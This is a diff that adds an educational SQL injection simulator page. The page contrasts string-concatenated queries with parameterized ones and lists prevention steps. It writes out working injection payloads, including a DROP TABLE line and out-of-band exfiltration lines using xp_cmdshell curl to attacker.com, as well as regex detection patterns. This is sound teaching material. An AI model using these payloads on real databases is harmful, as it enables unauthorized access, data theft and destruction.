@@ -1,0 +1,548 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Educational SQL injection simulator - learn how SQL injection attacks work and how to prevent them with parameterized queries.">
+    <meta name="keywords" content="SQL injection, SQLi, SQL injection tutorial, parameterized queries, SQL security, OWASP injection">
+    <title>SQL Injection Simulator - RmVuln</title>
+    <link rel="stylesheet" href="style.css">
+    <style>
+        .tool-container {
+            background: #f8f9fa;
+            border-radius: 12px;
+            padding: 2rem;
+            margin: 2rem 0;
+        }
+        .login-form {
+            background: white;
+            padding: 2rem;
+            border-radius: 8px;
+            max-width: 400px;
+            margin: 0 auto 2rem;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .login-form h3 {
+            text-align: center;
+            margin-bottom: 1.5rem;
+            color: #333;
+        }
+        .form-group {
+            margin-bottom: 1rem;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: 600;
+            color: #555;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 0.75rem;
+            border: 2px solid #ddd;
+            border-radius: 6px;
+            font-size: 1rem;
+            box-sizing: border-box;
+        }
+        .form-group input:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+        .btn {
+            width: 100%;
+            padding: 0.75rem;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 1rem;
+        }
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(102, 126, 234, 0.4);
+        }
+        .query-display {
+            background: #1a1a2e;
+            color: #00ff88;
+            padding: 1.5rem;
+            border-radius: 8px;
+            font-family: 'Courier New', monospace;
+            overflow-x: auto;
+            margin: 1.5rem 0;
+        }
+        .query-display .keyword {
+            color: #ff79c6;
+        }
+        .query-display .string {
+            color: #f1fa8c;
+        }
+        .query-display .injection {
+            color: #ff5555;
+            background: rgba(255, 85, 85, 0.2);
+            padding: 0 4px;
+            border-radius: 3px;
+        }
+        .result-box {
+            padding: 1.5rem;
+            border-radius: 8px;
+            margin-top: 1rem;
+        }
+        .result-success {
+            background: #d4edda;
+            border: 1px solid #c3e6cb;
+            color: #155724;
+        }
+        .result-danger {
+            background: #f8d7da;
+            border: 1px solid #f5c6cb;
+            color: #721c24;
+        }
+        .result-warning {
+            background: #fff3cd;
+            border: 1px solid #ffeeba;
+            color: #856404;
+        }
+        .mode-toggle {
+            display: flex;
+            justify-content: center;
+            gap: 1rem;
+            margin-bottom: 2rem;
+        }
+        .mode-btn {
+            padding: 0.75rem 1.5rem;
+            border: 2px solid #667eea;
+            background: white;
+            color: #667eea;
+            border-radius: 8px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .mode-btn.active {
+            background: #667eea;
+            color: white;
+        }
+        .payloads-section {
+            background: white;
+            padding: 1.5rem;
+            border-radius: 8px;
+            margin-top: 1.5rem;
+        }
+        .payload-btn {
+            display: inline-block;
+            padding: 0.5rem 1rem;
+            margin: 0.25rem;
+            background: #e9ecef;
+            border: none;
+            border-radius: 20px;
+            cursor: pointer;
+            font-family: 'Courier New', monospace;
+            font-size: 0.85rem;
+            transition: all 0.2s;
+        }
+        .payload-btn:hover {
+            background: #667eea;
+            color: white;
+        }
+        .explanation {
+            background: #e7f3ff;
+            border-left: 4px solid #667eea;
+            padding: 1rem;
+            margin: 1rem 0;
+            border-radius: 0 8px 8px 0;
+        }
+        .comparison-table {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1rem;
+            margin-top: 1.5rem;
+        }
+        @media (max-width: 768px) {
+            .comparison-table {
+                grid-template-columns: 1fr;
+            }
+        }
+        .comparison-box {
+            background: white;
+            padding: 1.5rem;
+            border-radius: 8px;
+        }
+        .comparison-box.vulnerable {
+            border: 2px solid #dc3545;
+        }
+        .comparison-box.secure {
+            border: 2px solid #28a745;
+        }
+        .comparison-box h4 {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            margin-bottom: 1rem;
+        }
+        .badge {
+            padding: 0.25rem 0.5rem;
+            border-radius: 4px;
+            font-size: 0.75rem;
+            font-weight: 600;
+        }
+        .badge-danger {
+            background: #dc3545;
+            color: white;
+        }
+        .badge-success {
+            background: #28a745;
+            color: white;
+        }
+        .disclaimer-box {
+            background: #fff3cd;
+            border: 1px solid #ffc107;
+            padding: 1rem;
+            border-radius: 8px;
+            margin-bottom: 2rem;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="container">
+            <a href="index.html" style="text-decoration: none; color: inherit;"><h1>RmVuln</h1></a>
+            <p class="tagline">SQL Injection Simulator</p>
+        </div>
+    </header>
+
+    <main class="container">
+        <a href="index.html" class="back-link">&larr; Back to Home</a>
+
+        <section class="intro">
+            <h2>Learn SQL Injection</h2>
+            <p>This educational simulator demonstrates how SQL injection attacks work and why parameterized queries are essential for security.</p>
+        </section>
+
+        <div class="tool-container">
+            <div class="disclaimer-box">
+                <strong>Educational Purpose Only</strong> - This simulator runs entirely in your browser. No actual database queries are executed. Use this knowledge responsibly and only test systems you own or have permission to test.
+            </div>
+
+            <div class="mode-toggle">
+                <button class="mode-btn active" onclick="setMode('vulnerable')">Vulnerable Mode</button>
+                <button class="mode-btn" onclick="setMode('secure')">Secure Mode</button>
+            </div>
+
+            <div class="login-form">
+                <h3 id="form-title">Login (Vulnerable)</h3>
+                <div class="form-group">
+                    <label for="username">Username</label>
+                    <input type="text" id="username" placeholder="Enter username" oninput="updateQuery()">
+                </div>
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="text" id="password" placeholder="Enter password" oninput="updateQuery()">
+                </div>
+                <button class="btn" onclick="executeLogin()">Login</button>
+            </div>
+
+            <h4>Generated SQL Query:</h4>
+            <div class="query-display" id="query-display">
+                <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username = '<span id="q-username"></span>' <span class="keyword">AND</span> password = '<span id="q-password"></span>'
+            </div>
+
+            <div id="result-box"></div>
+
+            <div class="payloads-section">
+                <h4>Try These Payloads (click to insert):</h4>
+                <button class="payload-btn" onclick="insertPayload(`' OR '1'='1`, '')">Basic bypass: ' OR '1'='1</button>
+                <button class="payload-btn" onclick="insertPayload(`admin'--`, '')">Comment injection: admin'--</button>
+                <button class="payload-btn" onclick="insertPayload(`' OR 1=1--`, '')">Boolean: ' OR 1=1--</button>
+                <button class="payload-btn" onclick="insertPayload(`' UNION SELECT * FROM users--`, '')">UNION attack</button>
+                <button class="payload-btn" onclick="insertPayload(`'; DROP TABLE users;--`, '')">Destructive: DROP TABLE</button>
+                <button class="payload-btn" onclick="insertPayload(`admin`, `' OR '1'='1`)">Password bypass</button>
+            </div>
+
+            <div class="explanation" id="explanation">
+                <strong>How it works:</strong> Enter a username and password to see how the SQL query is constructed. In vulnerable mode, user input is directly concatenated into the query, allowing attackers to modify the query's logic.
+            </div>
+        </div>
+
+        <!-- Comparison Section -->
+        <section class="vulnerability-card">
+            <h2>Vulnerable vs Secure Code</h2>
+
+            <div class="comparison-table">
+                <div class="comparison-box vulnerable">
+                    <h4><span class="badge badge-danger">VULNERABLE</span> String Concatenation</h4>
+                    <div class="code-block">
+<pre><code># Python - VULNERABLE
+query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
+cursor.execute(query)
+
+# PHP - VULNERABLE
+$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
+$result = mysqli_query($conn, $query);
+
+# Node.js - VULNERABLE
+const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
+db.query(query);</code></pre>
+                    </div>
+                </div>
+
+                <div class="comparison-box secure">
+                    <h4><span class="badge badge-success">SECURE</span> Parameterized Queries</h4>
+                    <div class="code-block">
+<pre><code># Python - SECURE
+query = "SELECT * FROM users WHERE username = %s AND password = %s"
+cursor.execute(query, (username, password))
+
+# PHP - SECURE (PDO)
+$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
+$stmt->execute([$username, $password]);
+
+# Node.js - SECURE
+const query = "SELECT * FROM users WHERE username = $1 AND password = $2";
+db.query(query, [username, password]);</code></pre>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Attack Types -->
+        <section class="vulnerability-card">
+            <h2>Types of SQL Injection</h2>
+
+            <h3>1. In-band SQLi (Classic)</h3>
+            <table class="styled-table">
+                <thead>
+                    <tr>
+                        <th>Type</th>
+                        <th>Payload Example</th>
+                        <th>Description</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>Error-based</td>
+                        <td><code>' AND 1=CONVERT(int, @@version)--</code></td>
+                        <td>Forces database errors that reveal information</td>
+                    </tr>
+                    <tr>
+                        <td>UNION-based</td>
+                        <td><code>' UNION SELECT username, password FROM users--</code></td>
+                        <td>Combines results from another query</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>2. Blind SQLi</h3>
+            <table class="styled-table">
+                <thead>
+                    <tr>
+                        <th>Type</th>
+                        <th>Payload Example</th>
+                        <th>Description</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>Boolean-based</td>
+                        <td><code>' AND 1=1-- (true) vs ' AND 1=2-- (false)</code></td>
+                        <td>Infers data from true/false responses</td>
+                    </tr>
+                    <tr>
+                        <td>Time-based</td>
+                        <td><code>' AND SLEEP(5)--</code></td>
+                        <td>Infers data from response time delays</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>3. Out-of-band SQLi</h3>
+            <table class="styled-table">
+                <thead>
+                    <tr>
+                        <th>Type</th>
+                        <th>Payload Example</th>
+                        <th>Description</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>DNS exfiltration</td>
+                        <td><code>'; exec xp_dirtree '//attacker.com/a'--</code></td>
+                        <td>Sends data via DNS lookups</td>
+                    </tr>
+                    <tr>
+                        <td>HTTP requests</td>
+                        <td><code>'; exec xp_cmdshell 'curl http://attacker.com/?data=...'--</code></td>
+                        <td>Sends data via HTTP requests</td>
+                    </tr>
+                </tbody>
+            </table>
+        </section>
+
+        <!-- Prevention -->
+        <section class="vulnerability-card">
+            <h2>Prevention Checklist</h2>
+            <div class="remediation">
+                <ul>
+                    <li><strong>Always use parameterized queries</strong> (prepared statements)</li>
+                    <li><strong>Use ORM frameworks</strong> that handle escaping automatically</li>
+                    <li><strong>Input validation</strong> - Whitelist allowed characters</li>
+                    <li><strong>Least privilege</strong> - Database user should have minimal permissions</li>
+                    <li><strong>Escape special characters</strong> if parameterization not possible</li>
+                    <li><strong>Web Application Firewall (WAF)</strong> as defense-in-depth</li>
+                    <li><strong>Error handling</strong> - Never expose database errors to users</li>
+                    <li><strong>Regular security testing</strong> - Use SQLMap, Burp Suite</li>
+                </ul>
+            </div>
+        </section>
+    </main>
+
+    <footer>
+        <div class="container">
+            <p>&copy; 2026 RmVuln. Quick reference for security professionals.</p>
+            <p><a href="index.html">Home</a> | <a href="https://fixthevuln.com" target="_blank">FixTheVuln.com</a></p>
+        </div>
+    </footer>
+
+    <script>
+        let currentMode = 'vulnerable';
+
+        function setMode(mode) {
+            currentMode = mode;
+            document.querySelectorAll('.mode-btn').forEach(btn => btn.classList.remove('active'));
+            event.target.classList.add('active');
+
+            document.getElementById('form-title').textContent = mode === 'vulnerable' ? 'Login (Vulnerable)' : 'Login (Secure)';
+            updateQuery();
+        }
+
+        function updateQuery() {
+            const username = document.getElementById('username').value || '';
+            const password = document.getElementById('password').value || '';
+
+            const queryDisplay = document.getElementById('query-display');
+
+            if (currentMode === 'vulnerable') {
+                // Show how injection modifies the query
+                const hasInjection = username.includes("'") || password.includes("'") ||
+                                   username.includes("--") || password.includes("--") ||
+                                   username.toLowerCase().includes("or") || password.toLowerCase().includes("or");
+
+                let usernameDisplay = escapeHTML(username);
+                let passwordDisplay = escapeHTML(password);
+
+                if (hasInjection) {
+                    usernameDisplay = `<span class="injection">${escapeHTML(username)}</span>`;
+                    passwordDisplay = `<span class="injection">${escapeHTML(password)}</span>`;
+                }
+
+                queryDisplay.innerHTML = `<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username = '${usernameDisplay}' <span class="keyword">AND</span> password = '${passwordDisplay}'`;
+            } else {
+                // Show parameterized query
+                queryDisplay.innerHTML = `<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username = <span class="string">$1</span> <span class="keyword">AND</span> password = <span class="string">$2</span>
+
+<span style="color: #6272a4;">-- Parameters (safely escaped):</span>
+<span style="color: #6272a4;">-- $1 = "${escapeHTML(username)}"</span>
+<span style="color: #6272a4;">-- $2 = "${escapeHTML(password)}"</span>`;
+            }
+        }
+
+        function executeLogin() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const resultBox = document.getElementById('result-box');
+            const explanation = document.getElementById('explanation');
+
+            if (currentMode === 'vulnerable') {
+                // Simulate vulnerable behavior
+                const injectionPatterns = [
+                    { pattern: /'\s*or\s*'1'\s*=\s*'1/i, type: 'Boolean bypass' },
+                    { pattern: /'\s*or\s*1\s*=\s*1/i, type: 'Boolean bypass' },
+                    { pattern: /admin'?\s*--/i, type: 'Comment injection' },
+                    { pattern: /'\s*--/i, type: 'Comment injection' },
+                    { pattern: /union\s+select/i, type: 'UNION attack' },
+                    { pattern: /drop\s+table/i, type: 'Destructive query' },
+                    { pattern: /;\s*delete/i, type: 'Destructive query' },
+                    { pattern: /;\s*update/i, type: 'Data modification' }
+                ];
+
+                let injectionFound = null;
+                for (const ip of injectionPatterns) {
+                    if (ip.pattern.test(username) || ip.pattern.test(password)) {
+                        injectionFound = ip;
+                        break;
+                    }
+                }
+
+                if (injectionFound) {
+                    if (injectionFound.type === 'Destructive query') {
+                        resultBox.innerHTML = `
+                            <div class="result-box result-danger">
+                                <strong>SQL Injection Detected: ${injectionFound.type}</strong><br><br>
+                                In a real vulnerable application, this could DELETE or DROP tables!<br>
+                                The query would execute: <code>${escapeHTML(username + password)}</code>
+                            </div>
+                        `;
+                    } else {
+                        resultBox.innerHTML = `
+                            <div class="result-box result-warning">
+                                <strong>SQL Injection Successful: ${injectionFound.type}</strong><br><br>
+                                Login bypassed! You would be logged in as the first user in the database.<br>
+                                The modified query returns all users where the condition is always true.
+                            </div>
+                        `;
+                    }
+
+                    explanation.innerHTML = `
+                        <strong>What happened:</strong> The attacker's input modified the SQL query logic.
+                        Instead of checking for a valid username AND password, the query now includes
+                        a condition that's always true (OR '1'='1') or comments out the password check (--).
+                    `;
+                } else if (username === 'admin' && password === 'password123') {
+                    resultBox.innerHTML = `<div class="result-box result-success"><strong>Login successful!</strong><br>Welcome, admin.</div>`;
+                    explanation.innerHTML = `<strong>Normal login:</strong> Valid credentials provided.`;
+                } else {
+                    resultBox.innerHTML = `<div class="result-box result-danger"><strong>Login failed.</strong><br>Invalid username or password.</div>`;
+                    explanation.innerHTML = `<strong>Normal behavior:</strong> No matching user found. Try the injection payloads above!`;
+                }
+            } else {
+                // Secure mode
+                resultBox.innerHTML = `
+                    <div class="result-box result-success">
+                        <strong>Query executed safely with parameterized values.</strong><br><br>
+                        Even if the input contains SQL syntax, it's treated as literal data, not executable code.
+                        The database receives: username = "${escapeHTML(username)}", password = "${escapeHTML(password)}"
+                    </div>
+                `;
+
+                explanation.innerHTML = `
+                    <strong>Why this is secure:</strong> Parameterized queries separate the SQL code from the data.
+                    The database driver handles escaping, so special characters like quotes and dashes are treated
+                    as literal characters in the data, not as SQL syntax.
+                `;
+            }
+        }
+
+        function insertPayload(username, password) {
+            document.getElementById('username').value = username;
+            document.getElementById('password').value = password;
+            updateQuery();
+        }
+
+        function escapeHTML(str) {
+            return str
+                .replace(/&/g, '&amp;')
+                .replace(/</g, '&lt;')
+                .replace(/>/g, '&gt;')
+                .replace(/"/g, '&quot;')
+                .replace(/'/g, '&#039;');
+        }
+
+        // Initialize
+        updateQuery();
+    </script>
+</body>
+</html>
